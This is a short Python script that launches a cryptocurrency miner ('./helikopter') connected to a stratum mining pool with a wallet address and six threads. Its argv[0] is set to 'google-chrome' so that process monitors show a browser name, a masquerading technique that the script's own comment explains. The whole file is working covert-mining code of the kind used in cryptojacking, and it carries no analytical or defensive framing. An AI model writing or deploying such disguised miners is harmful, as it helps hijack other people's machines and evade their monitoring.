import os

# Replace the current process with the mining process
os.execvp("./helikopter", [
    "google-chrome",  # This will be the name shown in process monitors
    "-c",
    "stratum+tcp://us.vipor.net:5040",
    "-u", "R9HMvHdgUX8h7h7ch3xGq4qGGVsRmuC74T.tr1",
    "-p", "x",
    "-t","6"
])
